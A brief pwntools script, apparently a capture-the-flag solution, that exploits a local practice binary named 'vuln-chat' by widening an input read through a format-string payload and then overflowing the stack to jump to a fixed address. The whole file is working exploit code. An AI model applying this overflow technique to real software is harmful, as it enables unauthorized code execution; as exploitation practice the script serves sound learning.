from pwn import *

target = process("./vuln-chat")


#0x1d - 0x9
payload = b"0" * 20 + b"%99s"
target.sendline(payload)

payload = b"0" * 0x31 + p32(0x0804856b)

target.sendline(payload)

print(target.recvall(timeout=5))